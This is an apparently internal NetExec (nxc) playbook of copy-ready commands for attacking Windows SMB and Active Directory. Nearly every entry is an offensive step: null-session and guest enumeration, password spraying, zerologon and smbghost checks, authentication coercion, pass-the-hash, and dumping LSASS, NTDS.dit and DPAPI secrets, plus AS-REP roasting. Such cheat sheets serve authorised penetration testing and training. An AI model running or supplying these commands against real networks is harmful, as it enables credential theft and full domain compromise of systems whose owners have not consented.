---
kind: reference
platform: generic
scope: internal
os: windows
tags: [nxc, netexec, smb, active-directory]
---

# NetExec (nxc) — SMB & AD Playbook

Canonical, copy-ready versions of the commands used across the walkthroughs.
Swap `TARGET` for a host, CIDR, or a targets file.

## Host discovery / hosts file

<!-- meta: technique=hostfile-generation -->
```bash
nxc smb 10.0.0.0/24 --generate-hosts-file ./hostsfile
```

## Null / guest / anonymous checks

<!-- meta: technique=user-enumeration -->
```bash
nxc smb TARGET -u '' -p '' --users
```

<!-- meta: technique=share-enumeration -->
```bash
nxc smb TARGET -u 'guest' -p '' --shares
```

## Authenticated enumeration

<!-- meta: technique=share-enumeration -->
```bash
nxc smb TARGET -u 'USER' -p 'PASS' --shares
```

<!-- meta: technique=user-enumeration -->
```bash
nxc smb TARGET -u 'USER' -p 'PASS' -d 'DOMAIN' --users
```

## Password spraying

<!-- meta: technique=password-spraying -->
```bash
nxc smb TARGET -u users.txt -p pass.txt --continue-on-success
```

## Vulnerability modules

<!-- meta: technique=vuln-scanning -->
```bash
nxc smb dcs.txt -u '' -p '' -M zerologon
nxc smb TARGET -u '' -p '' -M smbghost
```

<!-- meta: technique=coercion -->
```bash
nxc smb TARGET -u '' -p '' -M coerce_plus
```

## Pass-the-hash

<!-- meta: technique=pass-the-hash -->
```bash
nxc smb TARGET -u 'USER' -H 'NTHASH'
```

## Secrets dumping (needs admin on target)

<!-- meta: technique=lsass-dump -->
```bash
nxc smb TARGET -u 'USER' -p 'PASS' -M lsassy
```

<!-- meta: technique=ntds-dump -->
```bash
nxc smb DC -u 'USER' -H 'NTHASH' --ntds
```

<!-- meta: technique=dpapi-looting -->
```bash
nxc smb DC -u 'USER' -H 'NTHASH' --dpapi
```

## AS-REP roast over LDAP

<!-- meta: technique=asreproasting -->
```bash
nxc ldap TARGET -u 'USER' -p 'PASS' --asreproast asreproast-output.txt
```
